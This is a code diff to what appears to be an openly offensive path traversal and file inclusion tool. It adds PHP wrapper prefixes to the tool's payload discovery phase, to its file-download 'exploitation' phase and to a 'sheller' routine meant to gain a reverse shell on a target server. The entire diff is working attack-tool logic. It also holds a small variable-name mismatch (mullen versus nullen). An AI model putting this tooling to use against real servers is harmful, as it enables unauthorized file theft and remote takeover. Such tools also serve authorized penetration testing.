@@ -30,7 +30,7 @@ import core.variables as vars
 
 from core.methods.session import session, random_ua
 from core.colors import color
-from core.variables import payloadlist, nullchars, rce, isWindows
+from core.variables import payloadlist, nullchars, rce, isWindows, phase1_wrappers
 from core.methods.filecheck import filecheck
 from core.methods.loot import download
 from core.methods.progress import progress, progresswin, progressgui
@@ -41,6 +41,9 @@ from urllib.parse import unquote
 
 global maxlen
 maxlen = len(max(payloadlist, key=len))
+
+global mullen
+nullen = len(max(nullchars, key=len))
 
 requestcount = 0
 
@@ -149,7 +152,7 @@ def initialPing(s, attack, url, url2, keyword, timeout):
 
 
 def attackRequest(s, attack, url, url2, keyword, selected, traverse, file, directory, nullbyte,
-                  postdata, timeout, phase2=False, sheller=False):
+                  postdata, timeout, phase2=False, sheller=False, w=""):
     """
     This method executes the attack request and returns the result to the caller.
     @params:
@@ -195,7 +198,7 @@ def attackRequest(s, attack, url, url2, keyword, selected, traverse, file, direc
         elif sheller:
             requestlist.append((r, p, nullbyte, data, traverse))
         else:
-            requestlist.append((r, p, nullbyte))
+            requestlist.append((r, p, nullbyte, w))
     except Exception:
         pass
 
@@ -224,7 +227,12 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
     # variables for the progress counter
     global requestcount
     precise = vars.precise
-    totalrequests = len(payloadlist) * (len(nullchars) + 1)
+
+    prefixes = [""]
+    if vars.lfi:
+        prefixes += phase1_wrappers
+
+    totalrequests = len(payloadlist) * (len(nullchars) + 1) * len(prefixes)
     if not precise:
         totalrequests = totalrequests * (depth)
     timeout = vars.timeout
@@ -242,6 +250,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
     # initialize lists & session
     payloads = []
     nullbytes = []
+    found_prefixes = []
     s = session()
 
     if authcookie != "":
@@ -267,26 +276,29 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
 
             # send attack requests - no nullbyte injection
             requestlist = []
-            try:
-                requestlist += attackRequest(
-                    s, attack, url, url2, keyword, selected, traverse, file, "", "", postdata, timeout
-                )
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                print("Timeout reached for " + url)
-
-            # repeat for nullbytes
-            for nb in nullchars:
+            for prefix in prefixes:
+                combined = prefix + traverse
                 try:
                     requestlist += attackRequest(
-                        s, attack, url, url2, keyword, selected, traverse, file, "", nb, postdata,
-                        timeout
+                        s, attack, url, url2, keyword, selected, combined, file, "", "", postdata,
+                        timeout, w=prefix,
                     )
                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                     print("Timeout reached for " + url)
 
+                # repeat for nullbytes
+                for nb in nullchars:
+                    try:
+                        requestlist += attackRequest(
+                            s, attack, url, url2, keyword, selected, combined, file, "", nb, postdata,
+                            timeout, w=prefix,
+                        )
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                        print("Timeout reached for " + url)
+
             # analyze result
             found = False
-            for (r, p, nb) in requestlist:
+            for (r, p, nb, w) in requestlist:
                 lock.acquire()
                 try:
                     requestcount += 1
@@ -305,10 +317,13 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                         payloads.append(i)
                         if nb != "":
                             nullbytes.append(nb)
+                        if w != "":
+                            found_prefixes.append(w)
                         found = True
 
                         out = color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " "
-                        out = out + "{0:{1}}".format(i, maxlen) + " " + nb
+                        out = out + "{0:{1}}".format(i, maxlen) + " "
+                        out = out + "{0:{1}}".format(nb, nullen) + " " + w
 
                         print(out)
                 if verbose and not found:
@@ -320,11 +335,11 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             if found:
                 break
 
-    return (payloads, nullbytes)
+    return (payloads, nullbytes, found_prefixes)
 
 
 def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth, verbose, dl,
-           selected_payloads, selected_nullbytes, authcookie, postdata, dirlen, gui):
+           selected_payloads, selected_nullbytes, selected_prefixes, authcookie, postdata, dirlen, gui):
     """
     [Phase 2]: Exploitation
     @params:
@@ -341,6 +356,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         dl                 - download found files?
         selected_payloads  - payloads selected in phase 1
         selected_nullbytes - terminators selected in phase 1
+        selected_prefixes  - PHP wrappers selected in phase 1
         authcookie         - Authentication Cookie File to bypass Login Screens
         postdata           - POST Data for --attack 4
         dirlen             - total directory dictionary size (after permutations)
@@ -354,6 +370,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         totalrequests = len(selected_payloads) * fileslen * dirlen * depth
     else:
         totalrequests = len(selected_payloads) * len(selected_nullbytes) * fileslen * dirlen * depth
+    totalrequests *= len(selected_prefixes)
 
     if gui:
         lock.acquire()
@@ -394,25 +411,27 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
 
                         # send attack requests - with or without nullbyte injection
                         requestlist = []
-                        if selected_nullbytes == []:
-                            try:
-                                requestlist += attackRequest(
-                                    s, attack, url, url2, keyword, selected, traverse, file, dir, "",
-                                    postdata, timeout, phase2=True
-                                )
-                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                                print("Timeout reached for " + url)
-                                continue
-                        else:
-                            for nb in selected_nullbytes:
+                        for prefix in selected_prefixes:
+                            combined = prefix + traverse
+                            if selected_nullbytes == []:
                                 try:
                                     requestlist += attackRequest(
-                                        s, attack, url, url2, keyword, selected, traverse, file, dir, nb,
+                                        s, attack, url, url2, keyword, selected, combined, file, dir, "",
                                         postdata, timeout, phase2=True
                                     )
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
                                     continue
+                            else:
+                                for nb in selected_nullbytes:
+                                    try:
+                                        requestlist += attackRequest(
+                                            s, attack, url, url2, keyword, selected, combined, file, dir, nb,
+                                            postdata, timeout, phase2=True
+                                        )
+                                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                        print("Timeout reached for " + url)
+                                        continue
 
                         # analyze result
                         for (r, p, data) in requestlist:
@@ -487,7 +506,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, filespath, dirs, depth,
         return (found, urls)
 
 
-def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
+def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, wlist,
             authcookie, postdata, depth, gui, app):
     """
     second exploitation module: try to gain a reverse shell over the system
@@ -543,24 +562,26 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
 
                 # send attack requests - no nullbyte injection
                 requestlist = []
-                if nullist == []:
-                    try:
-                        requestlist += attackRequest(
-                            s, attack, url, url2, keyword, selected, traverse, file, "", "",
-                            postdata, timeout, sheller=True
-                        )
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        print("Timeout reached for " + url)
-                else:
-                    for nb in nullist:
+                for prefix in wlist:
+                    combined = prefix + traverse
+                    if nullist == []:
                         try:
                             requestlist += attackRequest(
-                                s, attack, url, url2, keyword, selected, traverse, file, "", nb,
+                                s, attack, url, url2, keyword, selected, combined, file, "", "",
                                 postdata, timeout, sheller=True
                             )
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
-                            continue
+                    else:
+                        for nb in nullist:
+                            try:
+                                requestlist += attackRequest(
+                                    s, attack, url, url2, keyword, selected, combined, file, "", nb,
+                                    postdata, timeout, sheller=True
+                                )
+                            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+                                print("Timeout reached for " + url)
+                                continue
 
                 # analyze result
                 found = False
@@ -864,7 +885,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
 
 
 def lfishell(techniques, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-             authcookie, postdata, depth, gui=None, app=None):
+             wlist, authcookie, postdata, depth, gui=None, app=None):
     """
     invoke sheller() for each technique
     @params:
@@ -879,7 +900,7 @@ def lfishell(techniques, attack, url, url2, keyword, cookie, selected, verbose, 
         app.processEvents()
     for technique in techniques:
         sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-                authcookie, postdata, depth, gui, app)
+                wlist, authcookie, postdata, depth, gui, app)
 
 
 def showStatus(gui, timeout=False, exception=None):
